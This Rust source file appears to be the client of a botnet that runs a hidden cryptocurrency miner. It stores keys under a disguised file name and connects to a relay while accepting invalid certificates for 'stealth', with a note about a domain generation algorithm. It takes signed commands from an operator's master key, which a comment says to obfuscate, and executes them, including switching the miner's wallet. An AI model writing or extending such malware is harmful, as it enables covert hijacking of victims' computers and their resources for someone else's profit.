use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::time;
use url::Url;
use tokio_tungstenite::{connect_async_tls_with_config, tungstenite::protocol::Message, Connector};
use futures_util::{StreamExt, SinkExt};
use crate::common::crypto::load_or_generate_keys;
use crate::utils::paths::get_appdata_dir;
use ed25519_dalek::{VerifyingKey, Signature, Verifier};
use std::convert::TryInto;
use protocol::{SignalMsg, GhostPacket, CommandPayload};
use std::num::NonZeroUsize;
use lru::LruCache;

// TODO: Obfuscate this!
const MASTER_PUB_HEX: &str = "0000000000000000000000000000000000000000000000000000000000000000"; 

struct ReplayTracker {
    seen_nonces: LruCache<u64, i64>, // Nonce -> Timestamp
}

impl ReplayTracker {
    fn new() -> Self {
        Self {
            seen_nonces: LruCache::new(NonZeroUsize::new(1000).unwrap()),
        }
    }

    fn is_valid(&mut self, nonce: u64, timestamp: i64) -> bool {
        let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as i64;
        
        // 1. Time Window check (60 seconds)
        if (now - timestamp).abs() > 60 {
            return false;
        }

        // 2. Nonce Check
        if self.seen_nonces.contains(&nonce) {
            return false;
        }

        // 3. Insert
        self.seen_nonces.put(nonce, timestamp);
        true
    }
}

pub async fn start_client() -> Result<(), Box<dyn std::error::Error>> {
    let key_path = get_appdata_dir().join("sys_keys.dat");
    let identity = load_or_generate_keys(key_path);
    let my_id = identity.pub_hex.clone();
    
    // Relay URL (Static or via DGA/Config)
    let url = Url::parse("wss://127.0.0.1:8080/ws")?; 
    
    // Persist Replay Tracker across reconnects
    let mut tracker = ReplayTracker::new();

    loop {
        // Allow self-signed certs (Stealth/Relay)
        let builder = native_tls::TlsConnector::builder()
            .danger_accept_invalid_certs(true)
            .build()?;
        let connector = Connector::NativeTls(builder);

        match connect_async_tls_with_config(url.clone(), None, false, Some(connector)).await {
            Ok((ws_stream, _)) => {
                let (mut write, mut read) = ws_stream.split();
                
                // 1. Register with Relay
                let reg = SignalMsg::Register { pub_key: my_id.clone() };
                write.send(Message::Text(serde_json::to_string(&reg)?.into())).await?;
                
                println!("Connected to Relay as {}", my_id);

                // 2. Event Loop
                let mut interval = time::interval(Duration::from_secs(30));
                
                loop {
                    tokio::select! {
                        _ = interval.tick() => {
                            // Send Ping to keep connection alive through NAT
                            if let Err(e) = write.send(Message::Ping(vec![])).await {
                                println!("Ping failed: {}", e);
                                break;
                            }
                        }
                        msg = read.next() => {
                            match msg {
                                Some(Ok(Message::Text(text))) => {
                                    if let Ok(signal) = serde_json::from_str::<SignalMsg>(&text) {
                                        match signal {
                                            SignalMsg::RelaySignal { source, data } => {
                                                println!("Received Ghost Signal from {}", source);
                                                // Verify Ghost Packet
                                                if let Ok(packet) = serde_json::from_str::<GhostPacket>(&data) {
                                                    if let Some(cmd) = verify_and_decrypt_command(&packet, &mut tracker) {
                                                        // Execute
                                                        process_command(&cmd);
                                                    } else {
                                                        println!("Verification Failed (Sig, Key, or Replay)!");
                                                    }
                                                }
                                            }
                                            _ => {}
                                        }
                                    }
                                }
                                Some(Ok(Message::Pong(_))) => { /* Ignore Pong */ }
                                Some(Ok(Message::Close(_))) | Some(Err(_)) | None => break,
                                _ => {}
                            }
                        }
                    }
                }
            }
            Err(e) => {
                println!("Connection failed: {}", e);
                time::sleep(Duration::from_secs(10)).await;
            }
        }
    }
}

fn verify_and_decrypt_command(packet: &GhostPacket, tracker: &mut ReplayTracker) -> Option<CommandPayload> {
    // 1. Verify Signature on Ciphertext (Authenticity)
    let pub_bytes = hex::decode(MASTER_PUB_HEX).ok()?;
    let public_key = VerifyingKey::from_bytes(&pub_bytes.try_into().ok()?).ok()?;
    let sig_bytes = hex::decode(&packet.signature).ok()?;
    let signature = Signature::from_bytes(&sig_bytes.try_into().ok()?);

    if public_key.verify(packet.ciphertext.as_bytes(), &signature).is_err() {
        return None;
    }

    // 2. Decrypt (Confidentiality + Shared Key Auth)
    let cmd = packet.decrypt()?;

    // 3. Replay Check
    if !tracker.is_valid(cmd.nonce, cmd.timestamp) {
        println!("Replay Detected or Stale Command");
        return None;
    }

    Some(cmd)
}

fn process_command(cmd: &CommandPayload) {
    println!("EXECUTING COMMAND: {}", cmd.action);
    // Implement Action Logic
    if cmd.action.starts_with("wallet:") {
        let parts: Vec<&str> = cmd.action.splitn(2, ':').collect();
        if parts.len() == 2 {
            if crate::system::logic::update_wallet_config(parts[1]) {
                println!("Wallet updated. Restarting miner...");
                let _ = crate::system::process::stop_mining();
            }
        }
    }
}
